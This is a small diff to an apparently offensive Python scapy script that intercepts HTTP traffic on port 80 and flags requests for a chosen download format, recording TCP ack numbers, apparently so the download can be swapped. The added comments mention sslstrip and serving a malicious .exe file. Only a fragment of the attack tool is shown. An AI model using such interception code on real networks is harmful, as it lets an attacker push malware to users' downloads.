@@ -43,7 +43,9 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):      
         if scapy_packet[scapy.TCP].dport == 80:     # Request
-            #if ".exe" in str(scapy_packet[scapy.Raw].load):        python3
+            #If ".exe" in str(scapy_packet[scapy.Raw].load):        python3
+            #When using sslstrip, be careful not to be in a loop if using .exe malicious file:
+            #If download_format in scapy_packet[scapy.Raw].load and "ichef.bbci.co.uk" not in scapy_packet[scapy.Raw].load:
             if download_format in scapy_packet[scapy.Raw].load:
                 print("[+] Attemp to download file "+ download_format +" format.")
                 ack_list.append(scapy_packet[scapy.TCP].ack)        
